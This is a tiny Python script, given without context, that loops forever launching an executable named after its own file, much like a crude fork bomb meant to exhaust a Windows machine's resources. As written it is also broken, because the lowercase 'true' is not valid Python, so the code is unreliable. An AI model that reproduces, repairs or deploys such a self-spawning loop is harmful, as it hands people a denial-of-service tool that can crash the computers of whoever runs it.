import os
while true:
    os.startfile(__file__[:-2]+"exe")